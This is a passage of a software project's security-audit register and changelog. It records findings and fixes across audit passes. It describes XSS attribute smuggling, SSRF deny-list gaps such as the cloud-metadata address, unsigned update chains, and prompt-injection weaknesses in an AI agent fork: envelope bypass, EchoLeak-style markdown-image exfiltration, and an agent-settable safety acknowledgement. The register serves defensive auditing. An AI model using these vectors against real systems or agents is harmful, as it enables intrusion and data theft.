| A5-05/A5-06 | **Closed** — pre-probe input gate; `wedged_delegations` surfaced | `revoke_malformed_principal_refused_loud`; core wedge assertion; live `wedged_delegations:[]` |
| A5-07/A5-11 | **Closed** — transfers loud warn; drain dead code out | code + existing suites green |
| A5-08/R5-01/R5-02/S5-03 | **Closed** — threshold boot refusal; `is_client_path`; both-side needles + honest scope; installer 0700 dirs | new pins green; live: `/apple` → API_CSP, `/app/` → CLIENT_CSP |
| A5-09/A5-10 | **Closed** — multi-get source convergence; builder-driven origin pin; poison arms behavioral; meta-pin reworked | `multi_get_carries_seam_shaped_source` + 3 in-src behavioral pins |
| L5-01–L5-07 | **Closed** — map rows (TAKE IT DOWN, HB26-1263, SB315 primary-verified 2026-09-12; CT/FL/WA precision) + Art 17 directive | primary-source URLs in the verification transcript |
| S5-01/S5-02 (fork) | **Closed** — turn-prepare bypass fixed + 5-test lane (4 fail reverted); superset contract | fork `60fb64b6aea`; vitest lanes green |
| K5-02 | **Closed** (typebox 1.3.26 four-way) | grep-verified |
| K5-01/K5-04/K5-05 | **Accepted open** — upstream velocity (rebase is mechanical per survival table); LAN-bind note; npm provenance unchecked | disclosed, owned |

Gates at ship: `cargo test --features bench,migrate` **1,537 passed / 0
failed** (1,526 at .82 + 11: 5 fourth-pass cargo pins + 7 session pins −1
removed seam-identity pin; reconciled per-target against a tag worktree);
`authz_matrix` 22/22; clippy bench + default `-D warnings` clean (the
default lane caught a `type_complexity` on the new forget 4-tuple —
fixed via named alias before ship); fmt (server+client) clean;
comment-hygiene guard green (8 new src comments de-labeled);
`badges.sh --selfcheck` clean; SBOM `sbom/brain-server-1.28.83.cdx.json`
committed; CRATE_TEST_FLOOR 1,381 → 1,418 (stale since .77, honest
catch-up); live drill on the release build all legs green; `diff -rq
plugin/src` ↔ fork extension clean. Lipstyk + otel/engine-crates/
steward lanes: see release checklist (run before push per AGENTS.md).
NOT tagged/pushed here — `scripts/release.sh` (CI watch, fail-closed) is
the operator's step.

---

## 2026-09-13 — Seventh-pass full-spectrum audit (v1.28.85 × fork @ 94d5de789c3)

Full report: `docs/SECURITY_AUDIT_20260913_SEVENTH_PASS.md` (all five lanes completed:
server-layers, satellites/supply-chain, Mode-B claims falsification, fork diff +
rebase-survival, worldwide regulatory web-verification — plus a live drill on a fresh DB /
test port and the §4 four-tree parity matrix). IDs `*7-*`. Theme of the pass, from the
evidence: **the machinery is strong; the seams added after the law are where the gaps
live** — ratchet erosion in miniature, plus a class the .75 vacuous-pin lesson predicted:
defenses built, fixture-tested, and never wired.

| # | Finding | Severity | Disposition |
|---|---|---|---|
| F7-03 | Graph route family (`/graph/entity`, `/graph/relations`, `/graph/traverse`, `/graph/relationships/{id}/history`) emits `entities.name`/`relation_type` RAW — no `sanitize_read`; markdown ingest makes entity names attacker-writable (headings/bold/wikilinks, no charset validation) | HIGH | **CLOSED v1.28.86 "Attrbane"** — all four mappers + the traverse mapper ride `sanitize_read_cow` (site-table rows added); the markdown write edge is decline-and-count (`normalize_name`/`normalize_rel_type`, `edges_skipped` in the response + in-tx audit note); `entity_type` gains the closed charset (structured 400s); live drill: hostile heading → 200 `edges_skipped:2`, zero hostile entity rows, traverse clean |
| F7-01 | Read seam has NO attribute tier: `on*` handlers + `javascript:`/`data:`/entity-encoded hrefs on surviving elements pass verbatim (live-demonstrated on /recall); architecture.md "cannot smuggle through a rendered URL" falsified at the raw wire | HIGH | **CLOSED v1.28.86 "Attrbane"** — the attribute tier inside the hostile-element fixpoint (scheme-hostile, delete-only, quote-aware tag-end, one bounded entity-decode pass); live drill: same canary rows raw on 1.28.85, attribute-free on 1.28.86; digest-409 + re-review live; THREAT_MODEL:294 + architecture.md re-stamped (T7-01 rides) |
| K7-01 | Fork/update chain: NO end-to-end signature verification on any channel (npm registry-trust, same-origin-only Node SHASUMS, git install without verify-tag, Sparkle EdDSA with no shipped `SUPublicEDKey`) — compromised channel = RCE; fork adds zero hardening over upstream | HIGH (inherited) | **ACCEPTED RISK (operator call 2026-09-13)** — not fixed in the fork: every touched file is upstream-owned (permanent rebase divergence); zero-conflict vehicle = upstream issue/PR the fork inherits by rebase; re-examine if the fork ships to third parties |
| F7-04 | Audit-per-write holes: `POST /procedure` stores caller content with NO audit row; structured `/ingest` + `/ump/remember` audit edges only (not the knowledge row); `/add` + markdown audit AFTER commit (the crash window the law closed) | MED | **CLOSED v1.28.86 "Attrbane"** — `AuditKind::Procedure` + in-tx row in `store_procedure`; knowledge-row audit beside the edge audits in `store_record`; both post-commit recordings moved inside their txs; rollback twin (trigger poison) proves the row rolls back WITH the write; live drill: procedure row on the chain, `/ump/audit/verify` ok (6/6 signed) |
| S7-01/S7-02 | Plugin hostile-element mirror NEVER CALLED (both trees); raw proposal/graph/decision fields bypass `sanitizeForBlock` into tool details/text | MED | **CLOSED v1.28.86 "Attrbane" (plugin 0.6.9, fork synced)** — `sanitizeForBlock` invokes the mirror at the server-canonical position; proposal-list details become a sanitized projection (sourcePrompt dropped), traverse paths + decision rule text + label fields ride the boundary; `provenance`/`evidence` get the deep string-leaf sanitize |
| L7-01 | CRA runbook final-report clock wrong for vulns (law: ≤14 days after a fix is available; runbook says one month for both triggers); reg_watch cites pre-OJ numbering (14(1)/(4)/(6), 69(2) → 14(1)-(2)/(3)-(4)/(5), 71(2)) | MED | **CLOSED v1.28.88 "Clocktruth"** — runbook final-report section split by trigger (vuln: 14 days after the corrective/mitigating measure is available, 14(2)(c); incident: one month after the notification, 14(4)(c)); CSIRT framing corrected to the single reporting platform → coordinator CSIRT (main establishment) + ENISA; reg_watch citations re-numbered to final-OJ + Art 71(2), AI Act horizon re-cited to Regulation (EU) 2026/1744 (OJ confirmed); `reg_watch_runbook_clock_anchor` anchors the 14-day wording (RED→GREEN); drill script template + timing report carry both clocks; citations re-verified 2026-09-14 |
| K7-03 | Today's 0.6.8 mirror-sync silently reverted the fork's typebox truth repair (manifest 1.3.27→1.3.26 vs lock) — the rebase-survival table's predicted class, realized day one | MED | **CLOSED v1.28.89 "Bounded"** — the fix is MECHANICAL: `scripts/sync-plugin.sh` learns the fork-field patch table (post-rsync rewrite of declared fork-side fields; typebox specifier ← the fork workspace catalog truth), the manifest==lock post-check fails closed on the mismatch (red-first demonstrated live 2026-09-14: manifest 1.3.26 vs lock 1.3.27 → GREEN post-patch), package.json joins the declared-exception list verified typebox-lines-only; re-run sync → manifest mechanically returned to 1.3.27 with the lockfile BYTE-UNTOUCHED (the manifest moved to meet the lock); fork acceptance: `pnpm install --frozen-lockfile` passes, vitest 71/71, tsc clean; fork commit `58767515d46` = sync outputs only (manifest + team-bridge 0.6.10 + its CHANGELOG), zero hand edits |
| K7-02/K7-04 | Sparkle trust anchor absent in-tree; shipped fly.toml sample tokenless on a public IP | MED | **ACCEPTED RISK (same operator call — upstream-owned files cluster)** |
| R7-09 | `service_layer_free_of_http_types` walks non-recursively — blind to `src/service/dsar/` + `lifecycle/` (4 files; no live violation verified) | MED-LOW | **CLOSED v1.28.88 "Clocktruth"** — collector extracted and made recursive (the no-SQL walker idiom); `transport_free_guard_walks_recursively` floors the subdirectory files at the measured 4 (plan's draft ≥5 was unforwardable — walk-measured truth rules); red-proof: planted `use axum::` in `lifecycle/` passed the old guard, fails the new one (plant never landed) |
| F7-02 | DSAR roots key on `owner`; operator-authored `/ingest/markdown` rows carry `owner=""` (drill: subject `loopback` → `found_count:0` while operator rows existed) — the controller's own ingests are unreachable by their subject | LOW | **CLOSED v1.28.87 "Ownerstamp"** — every content write is owner-stamped (the acting principal's `sub`; the opaque-mode superuser stamps the fixed `loopback` label) at the five write edges (`/add`, `/ingest`, `/ingest/markdown`, structured `/ingest`, the approve promotion; proposal creation stamps the candidate). Write-side only, no migration — historical NULL-owner rows stay stamp-blind by declaration (dated); no OR-arm sweep (a legacy arm would mis-attribute every NULL-owner row in multi-principal trees). Live drill: ingest → `/dsar` export for `loopback` → `roots:1`, the operator's own row; sqlite readback `owner=loopback` |
| F7-05 | `/ops/crew` roster attests a control it does not implement: the skills-view comment claims roster parity with the invisible-strip seam; the roster emitted `roles`/`skills`/`site` verbatim (the core invisible-strips `principal`/`current_case_ref` only); `current_case_ref` truncated 128, no charset validation | LOW | **CLOSED v1.28.87 "Ownerstamp"** — both crew views ride the read seam at the emission map (roles, skills, site join the stripped principal/case-ref); site-table rows added for both; red-first pin plants hostile roles/skills/site (the first pin attempt planted only the two core-stripped fields and passed — the shipped pin has teeth); write-side charset validation stays a disclosed ceiling |
| F7-06 | Admin-authored evidence surfaces emit stored text unshaped: breach `description`/event `body`/`noted_by`, transfer TIA/DPA pre-fills, profile/role `description`, `/audit` row `actor` | LOW | **CLOSED v1.28.87 "Ownerstamp"** — one sweep: `sanitize_value_strings` (deep string-leaf composition of the seam) applied at nine emission sites; no digest impact (none of these fields bind `review_digest`); idempotent on clean content; static TIA prompt text verified seam-clean before shipping |
| F7-07 | The read-seam wiring guard is a string-level regression lock: `handler_body` asserts a `sanitize_read` substring per listed handler — a comment containing the symbol false-passes; new routes invisible | INFO | **CLOSED v1.28.87 "Ownerstamp"** — `handler_body` comment-strips sources before matching (string-aware: line/block/doc comments, strings with escapes, the `'"'` char literal, `r#"…"#` raw strings; owned-body signature change propagates to every consuming guard); red-proof pin covers the false-pass, the honest call site, and the lexing hazards; the same-commit site-table row is now a release-checklist standing rule |
| R7-10/R7-11, T7-02..T7-06, L7-02..L7-06 | Hygiene + docs-truth band (typoglycemia doc math, chunker tag-split scope, 60s-staleness re-stamp ×3, rot-guard direction, coverage stamps, verify-surface clarification, TIDA date inversion, CA 09-10 package missing, SBOM CycloneDX 1.3, AI-RMF revision footnote) | LOW/INFO | **CLOSED v1.28.88 "Clocktruth"** — R7-10: docstrings corrected to same-first/last examples ("sysetm"), boundary pinned by negative assertion (no verdict change); R7-11: cross-chunk weld scope disclosed at the THREAT_MODEL ceilings + the chunker byte-split arm (downstream-consumer class; tag-aware split declined — needs its own evaluation); T7-03: three THREAT_MODEL rows + R-14 (+R-06, same dead cell) re-stamped to per-request zero-staleness, residual = registry-unavailability-fails-closed; T7-04: the crypto-inventory primitive census (closed 8-row crate→inventory mapping + crypto-family heuristic over `[dependencies]`, red-proofed with a planted `p256`); T7-05: THREAT_MODEL + SECURITY stamps moved to this release + the standing same-commit stamp policy; T7-02: tamper-evidence scope sentence (chain + UMP evidence rows; business rows = host ceiling); T7-06: verify-JSON row scoped as the consumer's out-of-band act; L7-02: TIDA dates un-inverted; L7-03: CA 2026-09-10 package (SB 1119) + the multi-state chatbot family row (GA SB 540, OR SB 1546); L7-05: SBOM spec 1.3 → **1.5** (the tool's ceiling — cargo-cyclonedx 0.5.9 emits 1.3/1.4/1.5 only and reads no config file; 1.6/1.7 = one-flag bump when upstream ships); L7-06: AI RMF mid-revision footnote. **The seventh-pass docs-truth band is empty after this release** (the sequencing table's remaining rows move: S7-05..S7-12, P7-01, L7-07 → v1.28.89 "Bounded"; S7-04/T7-01/F7-05/F7-06/F7-07 closed in .86/.87 as noted above) |
| S7-06..S7-11 | Satellites/supply-chain band: signal-gateway "LRU" cache unbounded; serde_yaml 0.9.34+deprecated in both lockfiles; team-bridge raw `String(err)` log; team-bridge raw control bytes (binary-classified file); green-CI tag gate procedural only; release.yml workflow-level write | LOW/INFO | **CLOSED v1.28.89 "Bounded"** — S7-06: cap 4,096 + evict-oldest-quarter (the v1.28.73 replay-cache law) on both legs of `tools/signal-gateway/src/cache.rs`'s `RecipientCache`, doc comment now says what the structure is (insertion-ordered, NOT LRU); `signal_gateway_cache_is_bounded` RED→GREEN; ceiling disclosed: the LIVE twin at `signal/worker.rs:31` (single map, no TTL) also unbounded — left as-is (standalone crate, operator runs no signal-gateway deployment, no CI lane added per operator call); S7-07: loader.rs DELETED (the declarative manifest loader had ZERO callers in-tree — a hand-rolled YAML-subset parser for dead code would be a new hazard, so the ponytail call is drop) + the optional dep out of the `harness-kernel` feature, which now pulls only serde_json; serde_yaml + unsafe-libyaml out of BOTH lockfiles; SDK semver note: the public loader module's removal is breaking for external engine consumers — none exist in-tree; S7-08: the `before_agent_run` catch wraps error detail in `sanitizeForBlock` (sibling discipline); S7-09: C0/DEL regex escaped (`\u0000-\u001F\u007F`) — the file reads as text again; both via plugin 0.6.10, fork synced (no hand edits); S7-10: release.yml pre-publish step queries the ci.yml run conclusion for the tagged SHA — red OR absent ⇒ refuse publish (the release.sh logic where the `git tag && git push --tags` bypass lives); S7-11: workflow permissions → `contents: read`, write scoped to the release job alone |
| S7-05, S7-12, P7-01, L7-07 | The seventh-pass remainder | LOW/INFO | S7-05 **CLOSED v1.28.91** — `env-truth.sh` `implemented()` is a CODE-SHAPE match now (`env::(var|var_os|set_var|remove_var)\(` with the var name on the read line): the bare substring counted comments/doc-strings/log lines/test fixtures as "implemented" — demonstrated red-first pre-fix (a knob documented as live whose only in-scope occurrence was a comment passed the old gate). 84 scoped names measured: 78 resolve by shape; the runtime-derived/external-consumer tail rides an explicit PINNED_CALLSITES inventory printed per hit (secrets-ladder derive ×2 for `BRAIN_CASE_STATUS_KEY(_FILE)` via `secrets::resolve("case_status")`, and `BRAIN_SERVER_AUTH_TOKEN` = openclaw-host substitution, writer `brain.rs`), plus DECLINED_NON_KNOBS for `BRAIN_MODEL_PROFILE` (configuration.md:55 itself declares it not a config key). `--selfcheck` keeps the red proof permanent (clean + hostile fixture trees; the hostile tree is exactly the comment-only false pass). Declared ceilings: a `#[cfg(test)]` fixture writing the var still counts; a multi-line `env::var(` whose name sits on a later line is missed — both fail toward scrutiny. S7-12 was a verified-good confirmation (no action). P7-01: **ACCEPTED CEILING** (client hostile-element mirror stays dormant until the wasm read-seam day — flip wired in that commit, never before). L7-07: **CLOSED v1.28.91 — re-verified 2026-09-15** (the search-timeout carry): Singapore IMDA shipped the Model AI Governance Framework for **Agentic AI** (2026-01-22, updated June 2026 — world-first agentic framework, five dimensions, VOLUNTARY guidance; lineage 2020 → GenAI 2024 → agentic 2026 — the one row that matters for the Loop line's 1.32.5 Legal-Live review); CoE Framework Convention on AI (CETS 225) **entered into force 2025-09-01** (five ratifications incl. three CoE members; EU a signatory since 2024-09-05). **L9-01 correction (2026-10-06):** this row said 2025-11-01 — contradicting `src/reg_watch.rs`'s `CETS_225_IN_FORCE` and `docs/compliance.md`, which pin 2025-09-01 from the CoE's own treaty text + entry-into-force statement (rm.coe.int / coe.int). No CoE primary was reachable from the audit environment to settle it live (403), and unlinked search favors 2025-09-01; the one-date rule wins over the stale row. If a future primary read proves 2025-11-01 instead, move ALL THREE sites in one commit; US export controls on model weights: the AI Diffusion Rule (would have licensed the most advanced weights) was **rescinded 2025-05-13** two days before its compliance date — BIS posture is guidance + enforcement signals + chokepoint chip controls, replacement rulemaking reported. All three unchanged-risk at component level (voluntary framework / no party duty for a single-operator local-first component / not a weights distributor). K7-01/02/04: **ACCEPTED RISK — FINAL** (operator call 2026-09-13; finalized 2026-09-15: the upstream-PR vehicle is DECLINED — compensating controls are procedural and recorded in THREAT_MODEL §5b's fork table: update runs are HITL lockfile-diff gates, no updates from untrusted networks, manual GPG check on Node runtime updates, fly.toml sample never deployed as-is; re-examine on third-party ship or upstream hardening) **— the seventh-pass register is fully dispositioned: zero open rows.** |

Held (the honest other half): 30+ claims falsification-attempted static (weld families,
opaque strips, 64-pass overflow fail-closed, JWT algs, constant-time compares, egress IANA
rows, redirect policy, insert-only pins, AgBOM, spire arithmetic 169=152+13+4+8 exact);
live drill green on digest-bound approvals (409/200/404-replay), revocation kill-switch
(write 401 + SSE 401 pre-stream), quarantine exclusion, DSAR certificate + digest-only
tombstones (physical residue = the documented `secure_delete off` ceiling, disclosed on
the certificate), audit-chain census, `/ready` JSON posture; tamper demonstration confirmed
the X-C5 host-compromise ceiling's shape (business-row tamper behind the chain undetected —
T7-02 docs note); four-tree invisible-set parity HELD (exhaustive fixture), plugin↔fork
byte-identical at 0.6.8; fork hardening survived today's 614-commit upstream rebase on
every reachable path; 5 of 6 sampled pins BEHAVIORAL; supply chain fresh (SBOM 375/375
match, typebox pinned). Gates: fmt/clippy bench/test bench/clippy default/test default/
client fmt/lipstyk(base=v1.28.85) ALL GREEN. Remediation: v1.28.86 "Attrbane" →
v1.28.87 "Ownerstamp" → v1.28.88 "Clocktruth" → v1.28.89 "Bounded", floor +13 (1,448 →
1,461 walk-estimate). Ceilings: drill legs b/c (fork-gateway session, console GUI) not
driven live; compliance-map rows beyond reg_watch dates spot-checked only; per-lane
coverage notes in the report.

## 2026-09-15 — v1.28.91 "Notary" — the operator-held evidence pair

Operator-directed closures of two standing disclosed ceilings; no pass
ran (the seventh pass's remediation line was complete; this release is the
follow-through on the residual-risk review, not an audit's findings).

| Item | Finding | Sev | Disposition |
|---|---|---|---|
| Ceiling narrowing | Business-row tamper behind the audit chain passes every in-tree verifier (R7-08 live-demonstrated 2026-09-13: `/ump/audit/verify` ok + `/verify` supports the tampered text — the chain protects its own rows, nothing binds business bytes) | MED (detection gap) | **NARROWED v1.28.91 "Notary"** — `brain anchor` / `--verify`: deterministic state fingerprint (chain head + knowledge content census + counts) recorded OFF-HOST by the operator; `anchor_detects_business_row_tamper` reproduces the R7-08 attack and names the census move on a still-green chain; `anchor_detects_chain_truncation`, reopen determinism, VACUUM-stability, line round-trip/refusal pins. Residual ceilings (disclosed): operator-chosen cadence = detection latency; COUNT-only census for proposals/workflow/dsar rows; detection, never prevention |
| Ceiling narrowing | DSAR physical residue: logical purge leaves purged bytes in freelist/WAL page images (disclosed on every certificate); strict-profile domains cover only their own run's deletes | MED (privacy posture) | **NARROWED v1.28.91 "Notary"** — `brain shred`: secure_delete=ON (readback asserted) → wal_checkpoint(TRUNCATE) → VACUUM → second TRUNCATE → integrity_check → one hash-chained `forget` row; freelist reads back 0; `shred_removes_deleted_row_residue` proves the marker greppable pre-shred (fixture teeth) and absent from main AND wal post-shred; `shred_writes_forget_evidence_and_keeps_chain_verifiable`. Residual ceilings (printed per run): filesystem copies, `.bak`, standby chunks, SSD wear-leveling; VACUUM needs ~DB-size free disk |
| CI gap closure | "Tests run on x86_64 only; shipped aarch64 binaries never executed by CI; keep the local Jetson smoke before fleet deploys" | LOW (Known Issues, open) | **CLOSED 2026-09-15 as NOT-APPLICABLE** — operator disposition: no Jetson deployment exists and brain-server is not installed on any aarch64 host; the advisory's precondition (fleet deploys) is absent. Reopen trigger: the first aarch64 fleet deployment (then: an ARM-hosted CI test lane, not the manual smoke) |
| Ride-alongs | CodeQL #74 (cleared pre-release, `b695c77`); K7-01/02/04 FINAL disposition docs | LOW/INFO | CodeQL fix rode main ahead of this release (assert-message taint hygiene); the K7 final disposition (no upstream PRs; procedural compensating controls) is recorded in THREAT_MODEL §5b + the seventh-pass register row above |

---

## 2026-10-04 — v1.29.2 eighth-pass full-spectrum audit (F8/D8/R8/P8/K8/S8/L8/T8)

Report: **[`docs/audit8/`](audit8/README.md)** (9 files). Scope: brain-server v1.29.2 HEAD
`e9c71919` × openclaw fork `1d2d29b22` (0 behind / **90** ahead, plugin 0.6.10). Fresh eyes —
prior reports not read.

**Note on the brief's framing.** The commission described this as the fourth pass at
`v1.28.82 "Vigil"`, 2026-09-12. Measured: HEAD is **v1.29.2 / `e9c71919`**, schema **1.32.25**,
today is **2026-10-04**; the fourth-, fifth- and seventh-pass reports are already committed. The
target report path was also already occupied, so this pass writes to `docs/audit8/` rather than
overwriting a colleague's work. The "gap ledger zero" claim the brief asked me to attack had
**already been retracted** upstream at v1.28.87 → "balanced (4 known residuals with owners)", with
a gate enforcing the wording (`grep -rn "gap ledger zer[o]" CHANGELOG.md docs/` → 0 hits).

### Findings + dispositions

| # | Finding | Severity | Disposition |
|---|---|---|---|
| F8-01 | `no_sql_in_handlers_enforced` counts only `select`/`insert`/`update`/`delete…from`, so it is blind to `PRAGMA`/`VACUUM`/`REPLACE` — and **two live violations sit in the tree** (`handlers/govern.rs:417-419`, `handlers/domains.rs:261`). **Proven by execution**: the guard returns `ok` with both present | **HIGH** | **CLOSED — R68 (verified 2026-10-05 at `9212a3e4`).** A SECOND structural counter now runs: `count_direct_db_calls` (`src/service/mod.rs:183`) matches call *shapes* (`Connection::open(`, `.execute_batch(`, `.execute(`, `.query_map(`) over production regions, alongside the original keyword counter (`:106`), which is left whole-file so the deliberate "comment residue counts" self-pin is untouched. Both named violations migrated: `govern.rs:417` → `service::snapshot_probe::snapshot_integrity`, `domains.rs:283/:295` → `domains_admin::delete_domain_data`/`vacuum`. The only remaining handler-tree rusqlite call (`ump_ops.rs:1160`) is inside `#[cfg(test)]`. **Red-proof re-run at R73:** planting `conn.execute_batch("REPLACE INTO knowledge VALUES (1)")` in `handlers/domains.rs` fails the guard — the exact shape the old keyword counter was blind to. |
| F8-08 | DSAR certifies `completed` while an **approved proposal's full text survives** — the sweep is `DELETE FROM proposals WHERE content LIKE '%subject%'`, and a proposal's body almost never contains its owner's identity. **Drill-proven** on a fresh DB | **HIGH** | **CLOSED — R69 (verified 2026-10-05 at `9212a3e4`).** Note the audit's premise needed correcting: the join it said was unreachable **required a migration** — `proposals.promoted_chunk_id` (`src/migration.rs:3169`, `pragma_table_info`-guarded, additive and NULLable). `record_promoted_chunk` (`review.rs:699`) is wired at the two approve sites, and `purge_promoted_proposals` (`dsar.rs:554`) does a chunked `WHERE promoted_chunk_id IN (…)` **after** the knowledge purge, in the caller's tx, so it walks genuinely-deleted chunks. The `content LIKE` arm is deliberately **kept** (`:862`) — removing it would reduce coverage for subjects whose text genuinely appears. **Named residual:** historical approved proposals keep a NULL edge and are **not** retro-linked. |
| F8-02 | The RBAC oracle `decide_gate_verdict` **never reads `required_action`**; its doc claims two enforcement properties the only production constructor makes unreachable (`MethodPolicy::Any`, `required_capability: ""`). The one pin covering it is self-asserting | **HIGH** | **PARTIALLY CLOSED — R68, and the enforcement half was DECLINED, not fixed.** What shipped: `router/auth.rs:53/:83` now says the verdict is the only denial the middleware can produce and that it does **not** read `required_action`, so the prose is true; and the self-asserting pin was replaced — `r47_gate_rows_read_their_declared_action` (`gates.rs:222`) now reads its expectation from the `AUTHZ_GATES` table literal rather than from `gate_for`, so it no longer consults the thing under test. **What did NOT ship: the oracle still does not read `required_action`** (`policy.rs:198-229`), and both dead `DenyReason` arms plus the field remain (pinned as reachable-only-if-constructed, `gates.rs:301-327`). The audit offered two remedies; **neither was taken**, by deliberate decision on second-opinion-surface grounds. Recording this as a flat "CLOSED" would misrepresent a declined design decision as a fix — which is the same defect the finding was filed about. |
| F8-03 | 30 s `TimeoutLayer` returns 408 while the abandoned `spawn_blocking` write still commits (tokio's blocking pool is not cancellable). No idempotency key, no request-id receipt; the post-commit `VACUUM` is swallowed with `let _ =` | **HIGH** | **CLOSED in part — R70 (verified 2026-10-05 at `9212a3e4`); the finding was two findings.** (a) The post-commit `VACUUM` was **already closed by R68** (`domains.rs:266` is `if let Err(e) = … vacuum(&conn)`, not `let _ =`) — the audit's own premise was stale and it was not re-fixed. (b) The 408/abandoned-write race: `src/service/write_deadline.rs` reads the clock **inside** the closure and refuses before any statement runs, as the closure's first statement before `pool.get()` (`domains.rs:275-277`), so a refusal provably took no connection and opened no transaction. The 30 s is now `config::REQUEST_TIMEOUT_SECS` with `WRITE_DEADLINE_MARGIN_SECS` held back. **Named residual:** the idempotency/receipt registry was NOT built (a wire contract and a new table); the ~50 other `spawn_blocking` write handlers still admit the window; and a write killed mid-commit by a crash is still uncovered. |
| F8-04 | `sanitize_log_value` has **one** production call site (`router/memory.rs:1956`); 14 tests exercise it, none asserts coverage. Unsanitised bypasses at `handlers/recall.rs:571` and `handlers/webhooks.rs:71,570` | MED | **CLOSED — R70 (verified 2026-10-05 at `9212a3e4`); the finding UNDERCOUNTED.** The guard found **eight** request/config-derived sites, not the two named — `recall.rs`, `domains.rs`, `webhooks.rs` ×2, `mod.rs` (`error = %message`), `observe.rs`, `ump_ops.rs`. Fixed with a `LogValue` newtype (`memory.rs:294`) whose **only** constructor is `sanitize_log_value`: no `From<&str>`/`From<String>`, no `Deref`, no `Default`, private field — each pinned, since any one re-opens the hole. The scan reads **both** value-carrying syntaxes (`{ident}` placeholders AND `%ident`/`?ident` fields), because the `webhooks.rs` offender is the field form. **Red-proof:** reverting the `recall.rs` conversion fires the guard naming that site. |
| F8-05 | `CRATE_TEST_FLOOR` is a raw `#[test]` substring count with ~146 units of slack and no comment-stripping. **The other four spire guards are NOT gameable** — each carries a genuine self-pin (verified) | MED | **CLOSED — R68 (verified 2026-10-05 at `9212a3e4`).** The counter now runs `count_needle(&strip_rust_comments(&text), "#[test]")` (`spire_inventory.rs:905`) — the stripper is **used**, not merely defined. `r68_stripper_is_string_aware_and_loses_no_code` asserts **both** directions, because every defect in a naive stripper pushed the count *downward* and so looked safe. **The floor was deliberately NOT re-baselined:** `CRATE_TEST_FLOOR` is still `2_758` while the needle reads ~2 950+, so raising it would spend the guard's remaining headroom on a measurement rather than on a round. Do not "helpfully" re-baseline it. |
| F8-06 | `/webhooks/` is exempt from authN *and* authZ by prefix, with no HMAC-enforcement pin. All six routes do verify and fail closed — this is an **unenforced convention, not a live hole** | MED | **CLOSED — R70 (verified 2026-10-05 at `9212a3e4`); the audit UNDERSCOPED the fix.** Replaced with an explicit `WEBHOOK_PATHS` const (`route_guards.rs:74`) naming all six, and `starts_with("/webhooks/")` is gone. **The regression this nearly shipped:** the three `is_public_path` call sites DISAGREE — `auth.rs:129` passes axum's `MatchedPath` (the template) while `:277`/`:549` pass `uri().path()` (the concrete path) — so an exact `contains` would have exempted the template and **refused every real request, silently disabling all six webhooks**. `is_webhook_path` matches segment-wise. Two fail-open bugs in the first draft were caught by the pin (`split('/')` on `{kind}`; a stale list entry). **Red-proof:** planting `.route("/webhooks/noverify", …)` in the real router fails the pin naming that route. |
| F8-10 | `BIND_PORT` is `.parse().unwrap_or(8765)` — a malformed value **silently binds the live port**. Found live during this audit's own drill | LOW | **CLOSED — R70 (verified 2026-10-05 at `9212a3e4`).** `resolve_bind_port_from` (`bootstrap.rs:1237`) returns `Result` and reuses the `WRITE_POSTURE` shape (absent/empty = 8765, so **no deployment changes behaviour**). The values were **measured, not assumed**, with a throwaway probe since deleted: `abc`/`65536`/`-1` fail the parse, but **`0` parses successfully** — so a parse-only fix would NOT have closed this, since port 0 binds a kernel-chosen ephemeral port that changes every restart. It is refused separately, naming the hazard. `876` is deliberately **not** a refusal (a valid `u16`). **Red-proof:** planting `if trimmed == "abc" { return Ok(8765); }` fires the pin. |
| F8-07 | `IPV4_DENY` omits `224.0.0.0/4` (IPv6 multicast **is** present) and `192.88.99.0/24`; `::a.b.c.d` not normalised | LOW | **CLOSED — R70 (verified 2026-10-05 at `9212a3e4`); the `::/96` half was worse than filed.** Both rows present (`webhook.rs:395-396`). The compatible-form gap was a **live admission**: `to_ipv4_mapped()` unwraps only `::ffff:0:0/96` (verified against the std source — bytes 10..12 == `0xff,0xff`), **not** `::/96`, so `::169.254.169.254` reached the v6 table unnormalised and was **admitted** — as were `::10.0.0.1` and `::192.168.1.77`, while the v4 table sat fully present and never consulted. Fixed by **normalisation**, not a deny row: a row refuses the `::/96` block, whereas normalisation subjects the embedded v4 to the **whole** v4 table and names the real reason. `::`/`::1` are deliberately not embeddings. **The pin caught a real misalignment** in the first draft (bytes 8..12 instead of 12..16). |
| F8-09 | DSAR roster sweep uses `.flatten()`, dropping row-mapping errors and under-counting the certificate; its adjacent branch fails closed on the same class | LOW | **CLOSED — R70 (verified 2026-10-05 at `9212a3e4`); the audit's reachability claim was WRONG in the direction that mattered.** It predicted the arm unreachable because `TEXT` affinity coerces every storage class. Measured against SQLite: true for `INTEGER` and `REAL`, **false for `BLOB`** — a BLOB `roster_json` is reachable and `r.get::<_, String>()` genuinely fails on it, so the honest **behavioural** pin was available (not the shape pin the audit's premise implied). Had that premise been carried, the pin would have been **green before the fix** while proving the other arm. The pin asserts `typeof(roster_json) == 'blob'` as a **precondition** so it fails loudly if a future schema change stops it discriminating. **Red-proof:** restoring `.flatten()` returns `Ok(SweepReport { crew_rows: 0, .. })` where a refusal is required. |
| K8-01 | Fork `wrapUntrustedToolText` skips its envelope on a **substring of attacker-controlled content** — one line in any file disables it on four untrusted seams | **HIGH** | **OPEN — R71 (fork repo)**. Anchored-regex strip, copying the shape at `web-search-output.ts:114-115` |
| K8-02 | `link-reader-content.ts` bypasses `remoteImageHosts` entirely — **upstream-owned, zero fork diff**, so it sits outside the fork's hardening | **HIGH** | **OPEN — R71**. Route it through `markdown-image-gate.ts` |
| K8-03 | The markdown-image strip regex misses reference-style images and raw `<img src=…>` — **the canonical EchoLeak vector** | MED-HIGH | **OPEN — R71** |
| K8-04 | All three gateway pre-handshake toggles **default off** (436 lines of new security code inert by default); the only compensating control is an advisory Doctor note | MED-HIGH | **DECISION, not a patch** — either default on for non-loopback binds, or record as a **declared non-claim** (this repo's own idiom) |
| K8-05 / K8-06 | `BRAIN_MCP_PINS_ACK=1` is an env ack an agent can set itself; catalog pins **silently no-op** when `agentDir` is unthreaded | MED | **OPEN — R71** |
| K8-07 | Four-way typebox drift (1.3.26 / 1.3.27 / 1.3.30 / 1.3.33) — `--frozen-lockfile` cannot pass despite a commit claiming it does | MED | **OPEN — R71** |
| K8-11 | The **Node-runtime update path is checksum-only, not signature-verified** (`install-cli.sh:1254-1264`; no gpg/cosign anywhere). The macOS appcast **is** Ed25519-signed | LOW | **OPEN — R71.** Split verdict recorded explicitly: app binary signed, runtime bootstrap not |
| K8-15 | A fork-built macOS app consumes **upstream's** appcast — so fork builds auto-update to upstream releases, silently discarding 90 commits | INFO | **DISCLOSED — R72.** Note in the fork docs |
